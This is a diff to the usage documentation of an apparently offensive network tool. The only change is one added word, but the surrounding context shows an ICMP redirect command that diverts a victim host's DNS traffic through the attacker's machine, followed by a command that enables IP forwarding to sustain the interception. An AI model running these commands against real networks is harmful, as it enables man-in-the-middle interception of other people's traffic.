@@ -67,7 +67,7 @@ Example: redirects 192.168.0.3's (victim) messages for Google server DNS (target
 ```
 python3 -m agave icmp redirect 8.8.8.8 192.168.0.2 192.168.0.3 192.168.0.1
 ```
-The command above is enough to get a couple of messages from the victim. But your system will not forward the messages to their destination, and will tell the victim to use another router to reach the destination. So you'll need also to:
+The command above is enough to get a couple of messages from the victim. But your system will not forward the messages to their destination, and will tell the victim to use another router to reach the destination instead. So you'll need also to:
 ```
 # Enable forwarding
 echo 1 | sudo tee /proc/sys/net/ipv4/conf/*/forwarding
